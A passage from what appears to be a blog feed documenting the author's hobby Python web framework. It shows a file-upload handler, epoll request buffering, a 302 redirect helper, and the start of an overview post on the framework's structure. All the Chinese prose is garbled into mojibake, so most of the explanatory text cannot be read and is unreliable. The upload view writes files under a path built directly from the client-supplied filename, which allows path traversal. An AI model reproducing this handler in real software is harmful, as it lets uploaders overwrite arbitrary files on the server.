class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_upload</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/file_upload.html&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.read()</span><br><span class="line">    result = Response(reply=result,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br><span class="line"></span><br><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">http_request</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    info(<span class="string">&quot;FILE Content&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    <span class="comment"># info(http_request.data[&quot;len&quot;]/1024,&quot;KB&quot;)</span></span><br><span class="line">    name = http_request.data[<span class="string">&quot;filename&quot;</span>]</span><br><span class="line">    <span class="comment"># print(http_request.data[&quot;file&quot;][:0x20])</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;/mnt/d/Github/muud/test/&quot;</span>+name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = f.write(http_request.data[<span class="string">&quot;file&quot;</span>])</span><br><span class="line">    data = <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;okok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;html&quot;</span>,status_code=<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p>ç›®å‰å‚è€ƒäº†Djangoçš„ä¸Šä¼ ï¼ŒæŠŠæ•°æ®ç»“æœæ”¶é›†åœ¨requestä¸­ç„¶åå¤„ç†</p><p>é‚£ä¹ˆå°±æ¶‰åŠHttpRequestçš„å¤„ç†</p><p>é¦–å…ˆæ–°å¢äº†ä¸¤ä¸ªå­—æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.length = <span class="number">0</span>     <span class="comment">#æ€»é•¿åº¦</span></span><br><span class="line">self.cur_len = <span class="number">0</span>    <span class="comment">#å½“å‰é•¿åº¦</span></span><br></pre></td></tr></table></figure><p>ä»è¿™ä¸ªåˆ¤æ–­æ–‡ä»¶ä¸Šä¼ æ˜¯å¦å®Œæˆï¼Œç„¶åå°±æ˜¯æ¶ˆæ¯çš„æå–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ–‡ä»¶ä¸Šä¼ ï¼Œè¿”å›bytesç±»å‹æ•°æ®</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;multipart&quot;</span> <span class="keyword">in</span> content_type:</span><br><span class="line">    pre_len = <span class="built_in">len</span>(self.raw_data.split(<span class="string">b&quot;\r\n\r\n&quot;</span>)[<span class="number">0</span>])+<span class="number">4</span></span><br><span class="line">    raw_data = self.raw_data[pre_len:]</span><br><span class="line">    self.cur_len = <span class="built_in">len</span>(raw_data)</span><br><span class="line">    self.data=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,   <span class="string">&quot;filename&quot;</span>:<span class="string">&quot;&quot;</span>,  <span class="string">&quot;file&quot;</span>:<span class="string">b&quot;&quot;</span>, <span class="string">&quot;len&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">    boundary = <span class="string">b&quot;--&quot;</span> + r_boundary.search(self.raw_data).group(<span class="number">1</span>)</span><br><span class="line">    file_info = raw_data.split(boundary)[<span class="number">1</span>].split(<span class="string">b&quot;\r\n&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> attribute <span class="keyword">in</span> file_info.split(<span class="string">b&quot;; &quot;</span>):</span><br><span class="line">        <span class="comment">#   è·å¾—åå­—</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;name&quot;</span> <span class="keyword">in</span> attribute <span class="keyword">and</span> <span class="string">b&quot;=&quot;</span> <span class="keyword">in</span> attribute <span class="keyword">and</span> <span class="keyword">not</span> attribute.lower().startswith(<span class="string">b&quot;content&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">0</span>] == <span class="string">b&quot;name&quot;</span>:</span><br><span class="line">                self.data[<span class="string">&quot;name&quot;</span>] = <span class="string">b&quot;&quot;</span>.join(attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">1</span>:])[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line">            <span class="keyword">elif</span> attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">0</span>] == <span class="string">b&quot;filename&quot;</span>:</span><br><span class="line">                <span class="comment">#   è·å¾—åŸå§‹æ–‡ä»¶å</span></span><br><span class="line">                self.data[<span class="string">&quot;filename&quot;</span>] = <span class="string">b&quot;&quot;</span>.join(attribute.split(<span class="string">b&quot;=&quot;</span>)[<span class="number">1</span>:])[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line">    file_type = raw_data.split(boundary)[<span class="number">1</span>].split(<span class="string">b&quot;\r\n&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    pre_len = <span class="built_in">len</span>(file_info) + <span class="built_in">len</span>(file_type) + <span class="number">2</span>*<span class="number">4</span> <span class="comment">#å‰ç½®é•¿åº¦</span></span><br><span class="line"></span><br><span class="line">    self.data[<span class="string">&quot;file&quot;</span>] = self.raw_data.split(boundary)[<span class="number">1</span>][pre_len:-<span class="number">2</span>]</span><br><span class="line">    self.data[<span class="string">&quot;len&quot;</span>] = <span class="built_in">len</span>(self.data[<span class="string">&quot;file&quot;</span>])</span><br></pre></td></tr></table></figure><p>ç”±äºä½¿ç”¨äº†epollæ¨¡å‹ï¼Œå½“ä¸Šä¼ çš„æ•°æ®é•¿åº¦å°äºæ€»é•¿åº¦æ—¶ç»§ç»­ä¸Šä¼ ï¼Œå®Œæˆåå†è¿›è¡Œå¤„ç†ï¼Œé‚£ä¹ˆserverå°±ä¼šæœ‰å¦‚ä¸‹ä¿®æ”¹</p><p>æ•°æ®å¯è¯»æ—¶ç»§ç»­è¯»å–å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> event &amp; select.EPOLLIN:</span><br><span class="line">    <span class="comment"># æœ‰æ•°æ®å¯è¯»</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="string">b&quot;&quot;</span></span><br><span class="line">        data = connections[fileno].recv(<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># print(&quot;data from server\n&quot;,data)</span></span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            requests[fileno] += data</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘çš„epollå¯¹æ¯ä¸ªå‘é€è¿‡æ¥çš„packageéƒ½æœ‰ä¸€ä¸ªresponseï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆå“åº”</span></span><br><span class="line"><span class="keyword">for</span> fileno, data <span class="keyword">in</span> requests.items():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;HTTP&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">b&quot;http&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># è§£æè¯·æ±‚å¤´éƒ¨</span></span><br><span class="line">        http = HTTPRequest(data=data, fileno=fileno, connections=connections)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> http.cur_len &lt; http.length:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            http.show()</span><br><span class="line">            http_route = HTTPRouter(http)</span><br><span class="line">            response = http_route.route()</span><br><span class="line">            responses[fileno] = response</span><br><span class="line"></span><br><span class="line">            connections[fileno].send(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ„é€ å“åº”å¤´éƒ¨å’Œå†…å®¹</span></span><br><span class="line">            <span class="comment"># æ¸…ç©ºè¯·æ±‚ç¼“å†²åŒº</span></span><br><span class="line">            response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            requests[fileno] = <span class="string">b&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d560daa9e9524c8c670e0fb8ee5109d2.png" alt="image-20230604123749998" /></p><p>ç„¶åæµ‹è¯•äº†ä¸‹æ•ˆç‡ï¼Œé¢å¯¹å°æ–‡ä»¶çš„æ—¶å€™æ•ˆç‡è¿˜è¯´å¾—è¿‡å»ï¼ˆ&lt;10MBï¼‰ï¼Œå¤§æ–‡ä»¶çš„è¯åˆæ˜¯ä½¿ç”¨çš„æ˜¯å¯¹åº”<code>fd</code>çš„dataè¿›è¡Œæ‹¼æ¥ï¼Œå¢å¤§äº†å†…å­˜å¼€é”€å’ŒCPUå¼€é”€ï¼ˆä¸çŸ¥é“ä½¿ç”¨cçš„æŒ‡é’ˆä¼šä¸ä¼šå¿«ä¸€äº›ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯åç»­éœ€è¦ä¼˜åŒ–çš„ä¸œè¥¿</p><p><img src="https://img.joe1sn.top/uploads/big/6ec85adf5a170138cfaf12cf96bf7bc5.png" alt="å°æ–‡ä»¶" /></p><p><img src="https://img.joe1sn.top/uploads/big/aa1d26b05febf943087b4b4fba07ba4a.png" alt="å¤§æ–‡ä»¶" /><img src="https://img.joe1sn.top/uploads/big/516a0bd7170f4b3101a24eaf0b62fc58.png" alt="å¤§æ–‡ä»¶2" /></p><p>æ›´å¤§çš„æ–‡ä»¶åé¢ä¼šå‡ºç°æŒ‡æ•°çº§ä¸‹é™ï¼Œä¸è¿‡è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ¥åŸºäºTCPçš„æ‹¥å¡æ§åˆ¶ï¼Œå•æ¬¡å‘åŒ…æœ€å¤§ä¸º128kbï¼Œåˆ†å—ä¼ è¾“ï¼Œåç»­å¯ä»¥é’ˆå¯¹è¿™äº›ç‰¹æ€§è¿›è¡Œæ”¹è¿›ã€‚</p><h2 id="6-6-é‡å®šå‘"><a class="markdownIt-Anchor" href="#6-6-é‡å®šå‘"></a> 6-6 é‡å®šå‘</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@http_api</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>(<span class="params">http_request</span>):</span><br><span class="line">    data= <span class="string">&quot;http://www.qq.com&quot;</span></span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,status_code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯é€šè¿‡302è·³è½¬è¿›è¡Œé‡å®šå‘ï¼Œç„¶ååœ¨è¿”å›æŠ¥æ–‡å“ªé‡Œè®¾ç½®äº†å‡ ä¸ªæ–°çš„å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consum</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\nLocation: &#123;location&#125;\r\n\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code], location=self.reply)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">&quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            status_code=self.status_code,   msg=status_code_dict[self.status_code])</span><br><span class="line">    result += <span class="string">&quot;Content-Type: &#123;type&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">type</span> = self.content_type)</span><br><span class="line">    result += <span class="string">&quot;Content-Length: &#123;length&#125;\r\n&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        length=self.length)</span><br><span class="line">    result += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result.encode()</span><br><span class="line">    <span class="keyword">if</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(self.reply) == <span class="built_in">bytes</span>:</span><br><span class="line">            result += self.reply</span><br><span class="line">        <span class="keyword">else</span>:   result += self.reply.encode()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥åœ¨utilsé‡Œé¢æ‰“åŒ…è¿™äº›æ–¹æ³•ï¼Œæˆ‘è¿™é‡Œæ”¾åœ¨http_responseä¸‹é¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å®šå‘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>(<span class="params">http_url</span>):</span><br><span class="line">    data= <span class="built_in">str</span>(http_url)</span><br><span class="line">    result = Response(reply=data,<span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,status_code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">return</span> result.consum()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€&lt;/p&gt;
&lt;p&gt;é¡¹ç›®åœ°å€ï¼š&lt;a href=&quot;https://github.com/Joe1sn/muud&quot;&gt;https://github.com/Joe1sn/muud&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="muud" scheme="https://joe1sn.eu.org/tags/muud/"/>
    
    <category term="web framework" scheme="https://joe1sn.eu.org/tags/web-framework/"/>
    
  </entry>
  
  <entry>
    <title>ã€Muudå¼€å‘ã€‘1.åŸºç¡€ç»“æ„è§£æ</title>
    <link href="https://joe1sn.eu.org/2023/06/01/web-0x1/"/>
    <id>https://joe1sn.eu.org/2023/06/01/web-0x1/</id>
    <published>2023-05-31T17:43:18.000Z</published>
    <updated>2023-06-01T14:31:23.538Z</updated>
    
    <content type="html"><![CDATA[<p>ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/Joe1sn/muud">https://github.com/Joe1sn/muud</a></p><span id="more"></span><h1 id="ç®€å•ä»‹ç»"><a class="markdownIt-Anchor" href="#ç®€å•ä»‹ç»"></a> ç®€å•ä»‹ç»</h1><p>â€‹åœ¨æ¯•ä¸šè®¾è®¡çš„æ—¶å€™ï¼Œåˆå§‹é€‰é¢˜ä¸ºã€ŠåŸºäºXMPPçš„å³æ—¶é€šè®¯ç³»ç»Ÿã€‹ï¼Œæƒ³çš„æ˜¯è‡ªå·±ç…§ç€RFCå†™ä¸€éXMPPåè®®ï¼Œä½†æ˜¯æ—¶é—´ä¸å¤Ÿï¼ˆæ¯•ç«Ÿè¦ä¸Šç­ï¼‰ã€‚æ‰€ä»¥æŠŠåºŸæ¡ˆå†åˆ©ç”¨ï¼ŒæŠ½å‡ºå…¶ä¸­çš„ä¸€äº›éƒ¨åˆ†ï¼Œ<strong>ä»Socketåˆ°webæ¡†æ¶</strong>ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„CURDåŠŸèƒ½ï¼Œé”»ç‚¼ä¸€ä¸‹è‡ªå·±çš„æ–‡æ¡£åŒ–ç¼–ç¨‹èƒ½åŠ›ã€‚å—æˆ‘ä¸ªäººèƒ½åŠ›æœ‰é™ä¼šéšæ—¶æ–­æ›´ï¼Œä¸€è·¯ä¸Šåªæœ‰vscodeå’ŒchatGPTä»¥åŠæ‰€éœ€è¦çš„RFCæ–‡æ¡£ã€‚</p><p>â€‹å†è¯´è¯´å·²å®ç°çš„éƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯ç¡®å®šåœ¨Linuxä¸Šè¿è¡Œçš„ï¼Œä½¿ç”¨pythonè¯­è¨€</p><ul><li><p>ä½¿ç”¨epollæ¨¡å‹å®Œæˆäº†éƒ¨åˆ†HTTPæœåŠ¡å™¨çš„åŠŸèƒ½</p><p><img src="https://img.joe1sn.top/uploads/big/dbd4bb8a1731037c6334379055b450bc.png" alt="image-20230601015224293" /></p></li><li><p>sqlalchemyå®Œæˆäº†æ•°æ®åº“çš„ORMå®ç°</p><p><img src="https://img.joe1sn.top/uploads/big/e832ffc52b70c65e6e796d14c5492273.png" alt="æ•°æ®åº“å®ç°" /></p><p><img src="https://img.joe1sn.top/uploads/big/204faa35fc0267fca1b4b8dd4e05f435.png" alt="ORMä½¿ç”¨ç¤ºä¾‹" /></p></li><li><p>è·¯ç”±é€šè¿‡é—­åŒ…å®Œæˆ</p><p><img src="https://img.joe1sn.top/uploads/big/9a90cd82302a2b47ca3be38818feccc7.png" alt="image-20230601015455217" /></p><p><img src="https://img.joe1sn.top/uploads/big/326180139c370cd9bb466210db93314d.png" alt="image-20230601015736199" /></p></li><li><p>è§†å›¾éƒ¨åˆ†ç¼–å†™ï¼ˆåªè€ƒè™‘JSONä¼ é€’ï¼‰</p><p><img src="https://img.joe1sn.top/uploads/big/55f5abfa762abc34bf49fe4d6389f374.png" alt="image-20230601015921484" /></p><p><img src="https://img.joe1sn.top/uploads/big/306a31c86f6d380858ddc90d451683af.png" alt="image-20230601015909570" /></p></li><li><p>å¯åŠ¨éƒ¨åˆ†å‚è€ƒäº†Djangoçš„è®¾è®¡</p><p><img src="https://img.joe1sn.top/uploads/big/0967be71afa21dab39ca0ca3f4809ea4.png" alt="image-20230601020119447" /></p></li></ul><p>æœ€åè¿è¡Œçš„æ•ˆæœ</p><p><img src="https://img.joe1sn.top/uploads/big/ef7a4d4dbaea1b76e34445f36e3c71da.png" alt="image-20230601020247259" /></p><h1 id="éœ€æ±‚åˆ†æ"><a class="markdownIt-Anchor" href="#éœ€æ±‚åˆ†æ"></a> éœ€æ±‚åˆ†æ</h1><p>æ ¹æ®ChatGPTï¼Œä¸€ä¸ªå…¸å‹çš„Python Webæ¡†æ¶é€šå¸¸ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒç»„ä»¶ç»„æˆï¼š</p><ol><li>è·¯ç”±ï¼ˆRoutingï¼‰ï¼šè·¯ç”±ç”¨äºå°†ä¼ å…¥çš„HTTPè¯·æ±‚æ˜ å°„åˆ°ç›¸åº”çš„å¤„ç†ç¨‹åºæˆ–è§†å›¾å‡½æ•°ä¸Šã€‚å®ƒç¡®å®šäº†ä¸åŒURLè·¯å¾„ä¸åº”ç”¨ç¨‹åºä¸­çš„ä¸åŒåŠŸèƒ½ç‚¹ä¹‹é—´çš„å…³è”å…³ç³»ã€‚</li><li>è§†å›¾ï¼ˆViewsï¼‰ï¼šè§†å›¾æ˜¯å¤„ç†HTTPè¯·æ±‚å¹¶ç”ŸæˆHTTPå“åº”çš„å‡½æ•°æˆ–æ–¹æ³•ã€‚å®ƒä»¬æ¥æ”¶æ¥è‡ªè·¯ç”±çš„è¯·æ±‚å¹¶æ‰§è¡Œç›¸åº”çš„é€»è¾‘ï¼Œæœ€åè¿”å›å“åº”ç»™å®¢æˆ·ç«¯ã€‚</li><li>æ¨¡æ¿å¼•æ“ï¼ˆTemplate Engineï¼‰ï¼šæ¨¡æ¿å¼•æ“å…è®¸å¼€å‘è€…å°†é™æ€æ¨¡æ¿å’ŒåŠ¨æ€æ•°æ®ç»“åˆï¼Œç”Ÿæˆæœ€ç»ˆçš„HTMLå“åº”ã€‚æ¨¡æ¿å¼•æ“é€šå¸¸æ”¯æŒæ¨¡æ¿è¯­æ³•ã€å˜é‡æ›¿æ¢ã€æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯ç­‰åŠŸèƒ½ï¼Œä»¥ç®€åŒ–åŠ¨æ€å†…å®¹çš„ç”Ÿæˆã€‚</li><li>ä¸­é—´ä»¶ï¼ˆMiddlewareï¼‰ï¼šä¸­é—´ä»¶æ˜¯ä½äºè¯·æ±‚å’Œè§†å›¾ä¹‹é—´çš„ç»„ä»¶ï¼Œç”¨äºåœ¨è¯·æ±‚åˆ°è¾¾è§†å›¾ä¹‹å‰æˆ–å“åº”è¿”å›å®¢æˆ·ç«¯ä¹‹å‰æ‰§è¡Œä¸€äº›é€šç”¨çš„åŠŸèƒ½ã€‚ä¸­é—´ä»¶å¯ä»¥å¤„ç†èº«ä»½éªŒè¯ã€è¯·æ±‚é¢„å¤„ç†ã€é”™è¯¯å¤„ç†ç­‰ä»»åŠ¡ã€‚</li><li>æ•°æ®åº“è®¿é—®ï¼ˆDatabase Accessï¼‰ï¼šWebæ¡†æ¶é€šå¸¸æä¾›äº†å¯¹æ•°æ®åº“çš„æ”¯æŒï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºå¯ä»¥ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ã€‚è¿™åŒ…æ‹¬è¿æ¥æ•°æ®åº“ã€æ‰§è¡ŒæŸ¥è¯¢å’Œæ“ä½œã€ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰ç­‰åŠŸèƒ½ã€‚</li><li>è¡¨å•å¤„ç†ï¼ˆForm Handlingï¼‰ï¼šWebåº”ç”¨ç¨‹åºé€šå¸¸éœ€è¦å¤„ç†ç”¨æˆ·æäº¤çš„è¡¨å•æ•°æ®ã€‚æ¡†æ¶æä¾›äº†è¡¨å•éªŒè¯ã€æ•°æ®ç»‘å®šã€é”™è¯¯å¤„ç†ç­‰åŠŸèƒ½ï¼Œä½¿å¼€å‘è€…å¯ä»¥æ–¹ä¾¿åœ°å¤„ç†è¡¨å•æ•°æ®ã€‚</li><li>èº«ä»½éªŒè¯ä¸æˆæƒï¼ˆAuthentication and Authorizationï¼‰ï¼šèº«ä»½éªŒè¯ç”¨äºéªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œè€Œæˆæƒåˆ™ç”¨äºç¡®å®šç”¨æˆ·æ˜¯å¦æœ‰æƒé™æ‰§è¡Œç‰¹å®šæ“ä½œã€‚æ¡†æ¶é€šå¸¸æä¾›äº†èº«ä»½éªŒè¯å’Œæˆæƒçš„æ”¯æŒï¼Œä»¥ä¾¿å¼€å‘è€…å¯ä»¥è½»æ¾å®ç°ç”¨æˆ·è®¤è¯å’ŒæˆæƒåŠŸèƒ½ã€‚</li><li>æµ‹è¯•æ¡†æ¶ï¼ˆTesting Frameworkï¼‰ï¼šæµ‹è¯•æ¡†æ¶ç”¨äºç¼–å†™å’Œæ‰§è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä»¥ç¡®ä¿åº”ç”¨ç¨‹åºçš„æ­£ç¡®æ€§å’Œç¨³å®šæ€§ã€‚å®ƒæä¾›äº†æµ‹è¯•ç”¨ä¾‹çš„ç¼–å†™ã€è¿è¡Œå’Œæ–­è¨€ç­‰åŠŸèƒ½ã€‚</li></ol><p>åæ¥çš„é¡¹ç›®åƒå‚è€ƒDjangoçš„è®¾è®¡</p><p>ç›®å‰é¡¹ç›®ç¼ºå°‘çš„ï¼š</p><ul><li>æ¨¡æ¿æ¸²æŸ“ï¼šè®¾è®¡çš„æ—¶å€™è€ƒè™‘åˆ°å‰åç«¯åˆ†ç¦»æ˜¯å¼€å‘ï¼Œæ²¡æœ‰æƒ³è¿‡æ¸²æŸ“</li><li>ä¸­é—´ä»¶ï¼šå®Œå…¨æ²¡æœ‰è®¾è®¡</li><li>è¡¨å•å¤„ç†ï¼šå®Œå…¨æ²¡æœ‰è®¾è®¡</li><li>æµ‹è¯•æ¡†æ¶ï¼šè¿˜åœ¨å­¦</li></ul><p>å¯¹äºDjangoè¿™æ ·çš„æ¡†æ¶æ¥è¯´ï¼Œå¼€å¯ä¸€ä¸ªé¡¹ç›®åï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ å¼€å¯çš„appåç§°</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ admin.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ apps.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ migrations</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ models.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ tests.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ views.py</span><br><span class="line">â”œâ”€â”€ é¡¹ç›®åç§°</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ asgi.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ settings.py</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ urls.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ wsgi.py</span><br><span class="line">â”œâ”€â”€ manage.py</span><br><span class="line">â”œâ”€â”€ static</span><br><span class="line">â””â”€â”€ templates</span><br></pre></td></tr></table></figure><p><code>views.py</code>æ˜¯è§†å›¾ã€<code>models.py</code>æ˜¯ORMå¯¹è±¡ã€<code>asgi.py\wsgi.py</code>æ˜¯HTTPæœåŠ¡ã€<code>setting.py</code>æ˜¯è®¾ç½®ã€<code>url.py</code>æ˜¯è·¯ç”±ï¼Œé¡¹ç›®ä»<code>manage,py</code>å¼€å§‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ•´ç†ä¸€ä¸‹åŸæ¥çš„ä»£ç äº†ã€‚</p><p>é‚£ä¹ˆç›®å‰é¡¹ç›®çš„ç»“æ„</p><figure class="highlight plaintext"><table><tr><td 